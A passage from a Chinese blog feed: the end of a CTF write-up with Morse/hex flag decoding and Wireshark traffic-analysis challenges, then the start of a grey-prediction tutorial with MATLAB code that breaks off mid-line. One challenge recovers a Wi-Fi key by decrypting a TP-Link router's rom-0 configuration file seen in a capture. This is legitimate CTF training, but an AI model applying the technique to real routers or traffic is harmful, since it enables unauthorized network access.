punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token comment" spellcheck="true">#一次性解码行不通，可以将其分为三段分别解码并且将三个非正常字符转为16进制：</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>晬<span class="token number">61677b6368</span>晬 <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x666c</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>ㅰ<span class="token number">74756e65</span>ㅰ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x3170</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>張<span class="token number">337665727c</span>張 <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x5f35</span><span class="token comment" spellcheck="true">#进行拼接</span><span class="token number">666c61677b6368317074756e655f35337665727c</span><span class="token comment" spellcheck="true">#可以得到</span>flag<span class="token punctuation">{</span>ch1ptune_53ver<span class="token operator">|</span><span class="token comment" spellcheck="true">#提交ch1ptune_53ver即可</span></code></pre><h3 id="Misc5-神秘的文件名-未解出"><a href="#Misc5-神秘的文件名-未解出" class="headerlink" title="Misc5-神秘的文件名(未解出)"></a>Misc5-神秘的文件名(未解出)</h3><blockquote><p> 可以通过binwalk得到一个逆向题，较难，未解出。</p></blockquote><h2 id="网络协议分析"><a href="#网络协议分析" class="headerlink" title="网络协议分析"></a>网络协议分析</h2><h3 id="网络协议分析1-数据包里有甜甜圈哦"><a href="#网络协议分析1-数据包里有甜甜圈哦" class="headerlink" title="网络协议分析1-数据包里有甜甜圈哦~"></a>网络协议分析1-数据包里有甜甜圈哦~</h3><blockquote><p>wireshark打开数据包后，依次使用以下过滤规则:<br><code>http contains flag</code></p><p><code>tcp contains flag</code></p><p><code>udp contains flag</code></p><p>即可通过<code>udp contains flag</code>查到flag。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5eaff1fee2.png" class="lazyload"></p></blockquote><h3 id="网络协议分析2-嘿嘿嘿-未解出"><a href="#网络协议分析2-嘿嘿嘿-未解出" class="headerlink" title="网络协议分析2-嘿嘿嘿(未解出)"></a>网络协议分析2-嘿嘿嘿(未解出)</h3><blockquote><p>经过疯狂手动提取后发现只能获得一丝图片，赛后得知需要用<strong>tcpflow</strong>这个神器重构损害的tcp数据，从而得到图像。</p></blockquote><h3 id="网络协议分析3-thief"><a href="#网络协议分析3-thief" class="headerlink" title="网络协议分析3-thief"></a>网络协议分析3-thief</h3><blockquote><p>拿到数据包打开后发现大部分都是<code>802.11 wlan</code>数据包，过滤一下http请求：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ebef87b2d.png" class="lazyload"></p><p>可以发现第一个请求的是<code>/rom-0</code>，确实不知为何就觉得这个是关键，google搜索一下：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ed05ddbaa.png" class="lazyload"></p><p>点进routerPwn发现是一个解压rom-0文件的网址，那我们是不是还缺一个文件。接下来通过导出http对象，我们可以得到一个rom0文件，正好将其解密得到以下内容：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#猜测是用来解密的密钥咯</span>Rome4040TP<span class="token operator">-</span>LINKpublicpublicpublicpublic</code></pre><p>在运用wireshark分析流量的过程中我们经常需要使用密钥之类的东西来解密流量，此处同样通过 <a href="https://blog.csdn.net/neal_hddnwpu/article/details/82586235?utm_source=blogxgwz2" target="_blank" rel="noopener">查询资料</a> 可以获得解密方式：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5eefeb803c.png" class="lazyload"></p><p>将密码Rome4040导入解密，可以发现的确出现了<strong>很多http和tcp的包</strong>，根据题目提示使用过滤<code>http contains CTF</code>得到flag：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ef72cfc64.png" class="lazyload"></p></blockquote><blockquote><p>🆒wandoucup-CTF-WP到此结束。</p><p>Publish by Yof3ng👌。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>灰色预测</title>
      <link href="/2018/10/27/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/"/>
      <url>/2018/10/27/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="灰色预测（Grey-model）"><a href="#灰色预测（Grey-model）" class="headerlink" title="灰色预测（Grey model）"></a>灰色预测（Grey model）</h1><blockquote><p>简单了解一下灰色预测这玩意儿。haha🙂</p></blockquote><h2 id="什么是灰色预测？"><a href="#什么是灰色预测？" class="headerlink" title="什么是灰色预测？"></a>什么是灰色预测？</h2><blockquote><p>灰色理论：</p><p>通过对原始数据的处理挖掘系统变动规律，建立相应微分方程，从而预测事物未来发展状况。 </p><ul><li>优点：对于不确定因素的复杂系统预测效果较好，且所需样本数据较小； </li><li>缺点：基于指数率的预测没有考虑系统的随机性，中长期预测精度较差。</li></ul><p>百度百科是这么说的：</p><p><a href="https://baike.baidu.com/item/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/7534704" target="_blank" rel="noopener">灰色预测</a>是就<a href="https://baike.baidu.com/item/%E7%81%B0%E8%89%B2%E7%B3%BB%E7%BB%9F/9595581" target="_blank" rel="noopener">灰色系统</a>【灰色系统是指“部分信息已知，部分信息未知“的”小样本“，”贫信息“的不确定系统，以灰色模型（G,M）为核心的模型体系。】所做的预测。所谓灰色系统是介于白色系统和黑箱系统之间的过渡系统。其具体的含义是:如果某一系统的全部信息已知为白色系统，全部信息未知为黑箱系统，部分信息已知，部分信息未知，那么这一系统就是灰色系统。</p></blockquote><h2 id="那么什么又是灰色预测法呢？"><a href="#那么什么又是灰色预测法呢？" class="headerlink" title="那么什么又是灰色预测法呢？"></a>那么什么又是灰色预测法呢？</h2><blockquote><p>一般地说，<a href="https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">社会系统</a>、<a href="https://baike.baidu.com/item/%E7%BB%8F%E6%B5%8E%E7%B3%BB%E7%BB%9F/3897147" target="_blank" rel="noopener">经济系统</a>、生态系统都是灰色系统。例如物价系统，导致物价上涨的因素很多，但已知的却不多，因此对物价这一灰色系统的预测可以用灰色预测方法。</p></blockquote><h2 id="灰色模型的应用"><a href="#灰色模型的应用" class="headerlink" title="灰色模型的应用"></a>灰色模型的应用</h2><blockquote><p>1、数列预测。对某现象随时间的顺延而发生的变化所做的预测定义为数列预测。例如对<a href="https://baike.baidu.com/item/%E6%B6%88%E8%B4%B9%E7%89%A9%E4%BB%B7%E6%8C%87%E6%95%B0" target="_blank" rel="noopener">消费物价指数</a>的预测，需要确定两个变量，一个是消费物价指数的水平。另一个是这一水平所发生的时间。</p><p>2、灾变预测。对发生灾害或异常突变时间可能发生的时间预测称为灾变预测。例如对地震时间的预测。</p><p>3、季节性灾变预测。对发生在每年特定时区的事件或命题作灰预测，称季节灾变灰预测。</p><p>4、拓扑预测。将原始数据作曲线，在曲线上按定值寻找该定值发生的所有<a href="https://baike.baidu.com/item/%E6%97%B6%E7%82%B9" target="_blank" rel="noopener">时点</a>，并以该定值为框架构成<a href="https://baike.baidu.com/item/%E6%97%B6%E7%82%B9%E6%95%B0%E5%88%97" target="_blank" rel="noopener">时点数列</a>，然后建立模型预测未来该定值所发生的时点。</p><p>5、<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E9%A2%84%E6%B5%8B/12609292" target="_blank" rel="noopener">系统预测</a>。对系统中众多变量间相互协调关系的发展变化所进行的预测称为系统预测。例如市场中<a href="https://baike.baidu.com/item/%E6%9B%BF%E4%BB%A3%E5%95%86%E5%93%81" target="_blank" rel="noopener">替代商品</a>、相互关联商品<a href="https://baike.baidu.com/item/%E9%94%80%E5%94%AE%E9%87%8F" target="_blank" rel="noopener">销售量</a>互相制约的预测。</p><p>6、包络灰预测。对于难以用数列预测或灾变预测处理，也不必用拓扑预测计算的离乱序列，可以构造上边界 GM(1，1) 与下边界 GM(1，1) 进行覆盖，这种边界模型即包络模型。</p></blockquote><h2 id="灰色模型测试"><a href="#灰色模型测试" class="headerlink" title="灰色模型测试"></a>灰色模型测试</h2><p>以sin(pi*x/20)函数为例，以单调性为区间检验灰色模型预测的精度 。</p><pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%摘自Angel_kitty师傅的matlab程序代码</span>clcclear all<span class="token comment" spellcheck="true">% 本程序主要用来计算根据灰色理论建立的模型的预测值。</span><span class="token comment" spellcheck="true">% 应用的数学模型是 GM(1,1)。</span><span class="token comment" spellcheck="true">% 原始数据的处理方法是一次累加法。</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>yy<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n    <span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT<span class="token operator">=</span>B<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token number">-1</span>    <span class="token function">YN</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN<span class="token operator">=</span>YN<span class="token operator">'</span><span class="token punctuation">;</span>A<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT<span class="token operator">*</span>B<span class="token punctuation">)</span><span class="token operator">*</span>BT<span class="token operator">*</span>YN<span class="token punctuation">;</span>a<span class="token operator">=</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u<span class="token operator">=</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t<span class="token operator">=</span>u<span class="token operator">/</span>a<span class="token punctuation">;</span>t_test<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%需要预测个数</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test<span class="token operator">+</span>n<span class="token punctuation">;</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t<span class="token punctuation">;</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n<span class="token operator">+</span>t_test<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token punctuation">;</span>xs<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">;</span>yn<span class="token operator">=</span><span class="token function">ys</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">)</span><span class="token punctuation">;</span>det<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n    det<span class="token operator">=</span>det<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det<span class="token operator">=</span>det<span class="token operator">/</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs<span class="token punctuation">,</span>yn<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'单调递增'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'实测值'</span><span class="token punctuation">,</span><span class="token string">'预测值'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'百分绝对误差为：'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'预测值为： '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">%递减</span>y1<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x1<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n1<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y1<span class="token punctuation">)</span><span class="token punctuation">;</span>yy1<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1    <span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B1<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT1<span class="token operator">=</span>B1<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token number">-1</span>    <span class="token function">YN1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN1<span class="token operator">=</span>YN1<span class="token operator">'</span><span class="token punctuation">;</span>A1<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT1<span class="token operator">*</span>B1<span class="token punctuation">)</span><span class="token operator">*</span>BT1<span class="token operator">*</span>YN1<span class="token punctuation">;</span>a1<span class="token operator">=</span><span class="token function">A1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u1<span class="token operator">=</span><span class="token function">A1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t1<span class="token operator">=</span>u1<span class="token operator">/</span>a1<span class="token punctuation">;</span>t_test1<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%需要预测个数</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test1<span class="token operator">+</span>n1<span class="token punctuation">;</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a1<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t1<span class="token punctuation">;</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n1<span class="token operator">+</span>t_test1<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x21<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token punctuation">;</span>xs1<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">;</span>yn1<span class="token 